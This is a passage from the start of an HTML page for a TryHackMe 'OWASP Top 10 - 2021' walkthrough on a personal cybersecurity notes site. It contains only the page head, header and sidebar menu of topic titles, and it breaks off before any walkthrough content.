
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
        <meta name="description" content="A collection of notes and writeups from my journey through cyber security concepts.">
      
      
        <meta name="author" content="Nouman Noor">
      
      
        <link rel="canonical" href="https://nanoor.github.io/CyberSec/walkthroughs/thm/owasptop10_2021/">
      
      
        <link rel="prev" href="../owaspjuiceshop/">
      
      
        <link rel="next" href="../picklerick/">
      
      
      <link rel="icon" href="../../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.5.46">
    
    
      
        <title>OWASP Top 10 - 2021 - CyberSec</title>
      
    
    
      <link rel="stylesheet" href="../../../assets/stylesheets/main.6f8fc17f.min.css">
      
        
        <link rel="stylesheet" href="../../../assets/stylesheets/palette.06af60db.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#task-1-introduction" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

<header class="md-header" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../../.." title="CyberSec" class="md-header__button md-logo" aria-label="CyberSec" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21.038 4.9 13.461.402a2.86 2.86 0 0 0-2.923.001L2.961 4.9A3.02 3.02 0 0 0 1.5 7.503v8.995c0 1.073.557 2.066 1.462 2.603l7.577 4.497a2.86 2.86 0 0 0 2.922 0l7.577-4.497a3.02 3.02 0 0 0 1.462-2.603V7.503A3.02 3.02 0 0 0 21.038 4.9M15.17 18.946l.013.646c.001.078-.05.167-.111.198l-.383.22c-.061.031-.111-.007-.112-.085l-.007-.635c-.328.136-.66.169-.872.084-.04-.016-.057-.075-.041-.142l.139-.584a.24.24 0 0 1 .069-.121.2.2 0 0 1 .036-.026q.033-.017.062-.006c.229.077.521.041.802-.101.357-.181.596-.545.592-.907-.003-.328-.181-.465-.613-.468-.55.001-1.064-.107-1.072-.917-.007-.667.34-1.361.889-1.8l-.007-.652c-.001-.08.048-.168.111-.2l.37-.236c.061-.031.111.007.112.087l.006.653c.273-.109.511-.138.726-.088.047.012.067.076.048.151l-.144.578a.26.26 0 0 1-.065.116.2.2 0 0 1-.038.028.1.1 0 0 1-.057.009c-.098-.022-.332-.073-.699.113-.385.195-.52.53-.517.778.003.297.155.387.681.396.7.012 1.003.318 1.01 1.023.007.689-.362 1.433-.928 1.888m3.973-1.087c0 .06-.008.116-.058.145l-1.916 1.164c-.05.029-.09.004-.09-.056v-.494c0-.06.037-.093.087-.122l1.887-1.129c.05-.029.09-.004.09.056zm1.316-11.062-7.168 4.427c-.894.523-1.553 1.109-1.553 2.187v8.833c0 .645.26 1.063.66 1.184a2.3 2.3 0 0 1-.398.039c-.42 0-.833-.114-1.197-.33L3.226 18.64a2.5 2.5 0 0 1-1.201-2.142V7.503c0-.881.46-1.702 1.201-2.142L10.803.863a2.34 2.34 0 0 1 2.394 0l7.577 4.498a2.48 2.48 0 0 1 1.164 1.732c-.252-.536-.818-.682-1.479-.296"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            CyberSec
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              OWASP Top 10 - 2021
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_0">
    
      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h4v-1.9H7c-1.71 0-3.1-1.39-3.1-3.1M8 13h8v-2H8zm9-6h-4v1.9h4c1.71 0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4a5 5 0 0 0 5-5 5 5 0 0 0-5-5"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="black" data-md-color-accent="black"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_2" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="black"  aria-label="Switch to system preference"  type="radio" name="__palette" id="__palette_2">
    
      <label class="md-header__button md-icon" title="Switch to system preference" for="__palette_0" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
      </label>
    
  
</form>
      
    
    
      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      <label class="md-header__button md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
      </label>
      <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
        </button>
      </nav>
      
        <div class="md-search__suggest" data-md-component="search-suggest"></div>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
            
<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
  <div class="md-grid">
    <ul class="md-tabs__list">
      
        
  
  
  
    <li class="md-tabs__item">
      <a href="../../.." class="md-tabs__link">
        
  
    
  
  Home

      </a>
    </li>
  

      
        
  
  
  
    
    
      
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../notes/misc/shellstabilisation/" class="md-tabs__link">
          
  
    
  
  Notes

        </a>
      </li>
    
  

    
  

      
        
  
  
    
  
  
    
    
      
  
  
    
  
  
    
    
      <li class="md-tabs__item md-tabs__item--active">
        <a href="../activedirectorybasics/" class="md-tabs__link">
          
  
    
  
  Walkthroughs

        </a>
      </li>
    
  

    
  

      
    </ul>
  </div>
</nav>
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    


  


<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../../.." title="CyberSec" class="md-nav__button md-logo" aria-label="CyberSec" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21.038 4.9 13.461.402a2.86 2.86 0 0 0-2.923.001L2.961 4.9A3.02 3.02 0 0 0 1.5 7.503v8.995c0 1.073.557 2.066 1.462 2.603l7.577 4.497a2.86 2.86 0 0 0 2.922 0l7.577-4.497a3.02 3.02 0 0 0 1.462-2.603V7.503A3.02 3.02 0 0 0 21.038 4.9M15.17 18.946l.013.646c.001.078-.05.167-.111.198l-.383.22c-.061.031-.111-.007-.112-.085l-.007-.635c-.328.136-.66.169-.872.084-.04-.016-.057-.075-.041-.142l.139-.584a.24.24 0 0 1 .069-.121.2.2 0 0 1 .036-.026q.033-.017.062-.006c.229.077.521.041.802-.101.357-.181.596-.545.592-.907-.003-.328-.181-.465-.613-.468-.55.001-1.064-.107-1.072-.917-.007-.667.34-1.361.889-1.8l-.007-.652c-.001-.08.048-.168.111-.2l.37-.236c.061-.031.111.007.112.087l.006.653c.273-.109.511-.138.726-.088.047.012.067.076.048.151l-.144.578a.26.26 0 0 1-.065.116.2.2 0 0 1-.038.028.1.1 0 0 1-.057.009c-.098-.022-.332-.073-.699.113-.385.195-.52.53-.517.778.003.297.155.387.681.396.7.012 1.003.318 1.01 1.023.007.689-.362 1.433-.928 1.888m3.973-1.087c0 .06-.008.116-.058.145l-1.916 1.164c-.05.029-.09.004-.09-.056v-.494c0-.06.037-.093.087-.122l1.887-1.129c.05-.029.09-.004.09.056zm1.316-11.062-7.168 4.427c-.894.523-1.553 1.109-1.553 2.187v8.833c0 .645.26 1.063.66 1.184a2.3 2.3 0 0 1-.398.039c-.42 0-.833-.114-1.197-.33L3.226 18.64a2.5 2.5 0 0 1-1.201-2.142V7.503c0-.881.46-1.702 1.201-2.142L10.803.863a2.34 2.34 0 0 1 2.394 0l7.577 4.498a2.48 2.48 0 0 1 1.164 1.732c-.252-.536-.818-.682-1.479-.296"/></svg>

    </a>
    CyberSec
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../../.." class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Home
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    
    
      
        
      
        
      
        
      
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
        
          
          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Notes
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2">
            <span class="md-nav__icon md-icon"></span>
            Notes
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    
    
      
        
      
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_1" >
        
          
          <label class="md-nav__link" for="__nav_2_1" id="__nav_2_1_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Misc
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_1">
            <span class="md-nav__icon md-icon"></span>
            Misc
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../notes/misc/shellstabilisation/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Shell Stabilisation
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
        
      
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" >
        
          
          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Network
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_2">
            <span class="md-nav__icon md-icon"></span>
            Network
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../notes/network/dns/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    DNS
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../notes/network/osimodel/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    OSI Model
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
        
      
        
      
        
      
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3" >
        
          
          <label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Privilege Escalation (Linux)
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_3">
            <span class="md-nav__icon md-icon"></span>
            Privilege Escalation (Linux)
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../notes/privesc_linux/crontab/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Cron Jobs
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../notes/privesc_linux/passwdshadow/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Passwd/Shadow File
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../notes/privesc_linux/pathvariable/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Path Variable
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../notes/privesc_linux/suid/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    SUID
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
    
  
  
  
    
    
      
        
      
    
    
      
        
        
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
        
          
          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
            
  
  <span class="md-ellipsis">
    Walkthroughs
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_3">
            <span class="md-nav__icon md-icon"></span>
            Walkthroughs
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
    
  
  
  
    
    
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
    
    
      
      
        
          
          
        
      
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1" checked>
        
          
          <label class="md-nav__link" for="__nav_3_1" id="__nav_3_1_label" tabindex="">
            
  
  <span class="md-ellipsis">
    THM
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_1_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_3_1">
            <span class="md-nav__icon md-icon"></span>
            THM
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../activedirectorybasics/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Active Directory Basics
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1_2" >
        
          
          <label class="md-nav__link" for="__nav_3_1_2" id="__nav_3_1_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Advent of Cyber 2022
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_1_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_1_2">
            <span class="md-nav__icon md-icon"></span>
            Advent of Cyber 2022
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../adventofcyber2022/day1/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 1 - Frameworks
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../adventofcyber2022/day2/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 2 - Log Analysis
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../adventofcyber2022/day3/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 3 - OSINT
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../adventofcyber2022/day4/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 4 - Scanning
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../adventofcyber2022/day5/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 5 - Brute Force
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../adventofcyber2022/day6/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 6 - Email Analysis
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../adventofcyber2022/day7/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 7 - Cyber Chef
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../adventofcyber2022/day8/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 8 - Smart Contracts
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../adventofcyber2022/day9/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 9 - Pivoting
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../adventofcyber2022/day10/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 10 - Hack a Game
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../adventofcyber2022/day11/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 11 - Memory Forensics
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../adventofcyber2022/day12/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 12 - Malware Analysis
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../adventofcyber2022/day13/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 13 - Packet Analysis
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../adventofcyber2022/day14/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 14 - Web Applications
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../adventofcyber2022/day15/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 15 - Secure Coding (Securing File Upload)
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../adventofcyber2022/day16/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 16 - Secure Coding (SQLi)
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../adventofcyber2022/day17/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 17 - Secure Coding (Regular Expressions)
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../adventofcyber2022/day18/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 18 - Sigma
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../adventofcyber2022/day19/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 19 - Hardware Hacking
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../adventofcyber2022/day20/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 20 - Firmware Reverse Engineering
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../adventofcyber2022/day21/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Day 21 - MQTT
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../authenticationbypass/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Authentication Bypass
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../basicpentesting/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Basic Pentesting
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../blue/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Blue
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../commandinjection/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Command Injection
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../commonlinuxprivesc/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Common Linux Privesc
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../crosssitescripting/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Cross-site Scripting
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../fileinclusion/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    File Inclusion
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../hydra/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Hydra
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../idor/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    IDOR
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../johntheripper/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    John the Ripper
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../kenobi/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Kenobi
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../linuxprivesc/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Linux PrivEsc
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../metasploitexploitation/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Metasploit - Exploitation
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../metasploitmeterpreter/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Metasploit - Meterpreter
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../motherssecret/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Mother's Secret
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../owaspjuiceshop/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    OWASP Juice Shop
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  <span class="md-ellipsis">
    OWASP Top 10 - 2021
  </span>
  

          <span class="md-nav__icon md-icon"></span>
